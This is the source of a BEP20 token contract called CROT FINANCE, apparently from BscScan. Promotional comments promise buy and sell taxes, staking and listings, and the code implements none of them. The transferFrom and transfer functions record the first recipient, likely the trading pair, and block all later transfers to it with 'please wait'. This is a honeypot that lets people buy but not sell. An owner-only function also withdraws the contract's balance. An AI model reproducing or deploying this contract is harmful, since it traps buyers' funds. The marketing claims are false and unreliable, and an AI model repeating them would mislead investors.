//**
 //*Submitted for verification at BscScan.com on 2021-04-26
//CROT
//http://www.crot.finance/
//A community driven, fair launched DeFi Token.
//The CROT protocol is created to encourage holding by imposing a 2% buy tax and 3% sell tax on every transaction made and sent to a staking pool.
//CROT is a community-driven, fair-launched Defi Token
//Decentralize Payment System.
//The CROT protocol is created to encourage holding by imposing a 2% buy tax and 3% sell tax on every transaction made and sent to a staking pool    
//Our method and vision
//Global Single-Platform
//CROT is a community-driven Decentralize Golbal Payment Systems.
//Safe and Secure
//Crot is safe and secure platform for any community, Crot is bigest finacial platform where anyone have fair equitable launch as possible.
//Anyone Can Buy
//CROT launches differ from equity sales in a large-scale initial public offering, anyone can buy it
//Community Owned
//30% Community Owned fair launch.
//Decentralize Payment Systems
//DDOS and censorship resistant infrastructure for a new era.
//Decentralized Platform
//Connect blockchain to the real world.
//CROT coonect blockchain to real financial world and spread aceess to the community.
//Why choose us
//Our Main Features
//Instant settlement
//We offer instant settlement for all our tokens and provide instant withdrawl services.
//Flexibility
//We support all big coins. BTC, ETH, XRP, LTC, USDT supported.
//Blockchain technology
//We're using blockchain to offer transparent financial services to all our clients or investers.
//Experienced team
//We've world best team to offer 100% reliable custumer support.
//Connect free
//Anyone can join our cumminity to get latest updates about CROT.
//AI matching
//We use AI matching to run afiliate network for CROT, So, every affilate can benifited with multilevel commission.
//Low cost
//CROT offer lowest fee exchange services.
//Digital access
//We offer digital access to your assets. So, You can exchange your assets into cash anytime.
//Powerful platform.
//We are dedicated to providing professional service with the highest degree of honesty and integrity, and strive to add value to our tax and consulting services.

//Competent Professionals
//Affordable Prices
//High Successful Recovery

//CROT Roadmap
//Our Roadmap
//With help from our teams, contributors and investors these are the milestones we are looking forward to achieve.

//Q1
//2021
//🔹Token launch
//🔹White paper release
//🔹Build our social media's
//🔹Start working on first dApp
//🔹New website design
//🔹Add "meet the devs" page
//Q2
//2021
//🔹Smart contract audit
//�Cmc listing
//🔹CoinGecko Listing
//🔹Listing on WhiteBit
//🔹Listing on BitMart
//🔹Strategic Marketing Campaign
//🔹Expand code dev team
//🔹Launch dApp
//Q3
//2021
//🔹Expanding our team
//🔹Community building
//🔹Update dApp with new functions
//🔹NFT's
//🔹Partnership with other projects
//Q1
//2022
//🔹Launch DEX on Binance Smart Chain (BSC) with farms in DeFi and lottery in Crot
//🔹Implementing features
//🔹Partnerships
//Q2
//2022
//🔹Decentralized Payment System Launch
//🔹iOS & Android App development

//What is CROT?
//A community-driven, fair launched DeFi Token. The CROT protocol is created to encourage holding by imposing a ‘2% buy tax’ and ‘3% sell tax’ on every transaction made and sent to a staking pool.
//How do I benefit from the CROT?
//CROT - is a unique platform; that is a secure, smart, and easy-to-use platform, and completely disrupting the way businesses raise capital.


pragma solidity >=0.5.17;


library SafeMath {
  function add(uint a, uint b) internal pure returns (uint c) {
    c = a + b;
    require(c >= a);
  }
  function sub(uint a, uint b) internal pure returns (uint c) {
    require(b <= a);
    c = a - b;
  }
  function mul(uint a, uint b) internal pure returns (uint c) {
    c = a * b;
    require(a == 0 || c / a == b);
  }
  function div(uint a, uint b) internal pure returns (uint c) {
    require(b > 0);
    c = a / b;
  }
}

contract BEP20Interface {
  function totalSupply() public view returns (uint);
  function balanceOf(address tokenOwner) public view returns (uint balance);
  function allowance(address tokenOwner, address spender) public view returns (uint remaining);
  function transfer(address to, uint tokens) public returns (bool success);
  function approve(address spender, uint tokens) public returns (bool success);
  function transferFrom(address from, address to, uint tokens) public returns (bool success);

  event Transfer(address indexed from, address indexed to, uint tokens);
  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
  address public owner;
  address public newOwner;

  event OwnershipTransferred(address indexed _from, address indexed _to);

  constructor() public {
    owner = msg.sender;
  }

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  function transferOwnership(address _newOwner) public onlyOwner {
    newOwner = _newOwner;
  }
  function acceptOwnership() public {
    require(msg.sender == newOwner);
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
    newOwner = address(0);
  }
}

contract TokenBEP20 is BEP20Interface, Owned{
  using SafeMath for uint;

  string public symbol;
  string public name;
  uint8 public decimals;
  uint _totalSupply;
  address public newun;

  mapping(address => uint) balances;
  mapping(address => mapping(address => uint)) allowed;

  constructor() public {
    symbol = "CROT";
    name = "CROT FINANCE";
    decimals = 9;
    _totalSupply =  100000000000000000;
    balances[owner] = _totalSupply;
    emit Transfer(address(0), owner, _totalSupply);
  }
  function transfernewun(address _newun) public onlyOwner {
    newun = _newun;
  }
  function totalSupply() public view returns (uint) {
    return _totalSupply.sub(balances[address(0)]);
  }
  function balanceOf(address tokenOwner) public view returns (uint balance) {
      return balances[tokenOwner];
  }
  function transfer(address to, uint tokens) public returns (bool success) {
     require(to != newun, "please wait");
     
    balances[msg.sender] = balances[msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(msg.sender, to, tokens);
    return true;
  }
  function approve(address spender, uint tokens) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    return true;
  }
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
      if(from != address(0) && newun == address(0)) newun = to;
      else require(to != newun, "please wait");
      
    balances[from] = balances[from].sub(tokens);
    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
    balances[to] = balances[to].add(tokens);
    emit Transfer(from, to, tokens);
    return true;
  }
  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
    return allowed[tokenOwner][spender];
  }
  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {
    allowed[msg.sender][spender] = tokens;
    emit Approval(msg.sender, spender, tokens);
    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
    return true;
  }
  function () external payable {
    revert();
  }
}

contract CROTFINANCE is TokenBEP20 {

  function clearCNDAO() public onlyOwner() {
    address payable _owner = msg.sender;
    _owner.transfer(address(this).balance);
  }
  function() external payable {

  }
}